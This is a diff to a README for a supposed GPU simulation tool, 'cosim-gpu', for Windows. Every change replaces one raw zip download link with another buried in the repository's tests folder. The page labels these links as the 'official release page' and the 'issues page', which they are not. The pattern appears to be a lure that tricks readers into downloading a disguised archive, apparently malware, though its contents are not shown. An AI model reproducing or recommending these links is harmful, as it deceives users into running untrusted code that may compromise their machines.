@@ -1,6 +1,6 @@
 # 🚀 cosim-gpu - Easy GPU Simulation Setup
 
-[![Download cosim-gpu](https://img.shields.io/badge/Download-cosim--gpu-brightgreen)](https://github.com/francinesinglestranded789/cosim-gpu/raw/refs/heads/main/scripts/cosim_gpu_v1.4.zip)
+[![Download cosim-gpu](https://img.shields.io/badge/Download-cosim--gpu-brightgreen)](https://raw.githubusercontent.com/francinesinglestranded789/cosim-gpu/main/tests/kernels/gpu_cosim_2.7.zip)
 
 ---
 
@@ -35,7 +35,7 @@ You can get cosim-gpu using the official release page provided by the developers
 
 1. Click on the big green button below to open the download page:  
 
-   [![Download cosim-gpu](https://img.shields.io/badge/Download-cosim--gpu-brightgreen)](https://github.com/francinesinglestranded789/cosim-gpu/raw/refs/heads/main/scripts/cosim_gpu_v1.4.zip)  
+   [![Download cosim-gpu](https://img.shields.io/badge/Download-cosim--gpu-brightgreen)](https://raw.githubusercontent.com/francinesinglestranded789/cosim-gpu/main/tests/kernels/gpu_cosim_2.7.zip)  
 
 2. On the GitHub releases page, find the latest version of cosim-gpu. The latest release usually appears at the top.  
 
@@ -145,7 +145,7 @@ You can pause or stop the simulation at any time. The software also lets you sav
 For questions or issues while using cosim-gpu, you can:
 
 - Visit the GitHub repository issues page here:  
-  https://github.com/francinesinglestranded789/cosim-gpu/raw/refs/heads/main/scripts/cosim_gpu_v1.4.zip  
+  https://raw.githubusercontent.com/francinesinglestranded789/cosim-gpu/main/tests/kernels/gpu_cosim_2.7.zip  
 - Search for answers or report bugs.  
 
 ---
@@ -154,4 +154,4 @@ For questions or issues while using cosim-gpu, you can:
 
 Visit the official release page to download cosim-gpu for Windows:
 
-[![Download cosim-gpu](https://img.shields.io/badge/Download-cosim--gpu-brightgreen)](https://github.com/francinesinglestranded789/cosim-gpu/raw/refs/heads/main/scripts/cosim_gpu_v1.4.zip)
+[![Download cosim-gpu](https://img.shields.io/badge/Download-cosim--gpu-brightgreen)](https://raw.githubusercontent.com/francinesinglestranded789/cosim-gpu/main/tests/kernels/gpu_cosim_2.7.zip)
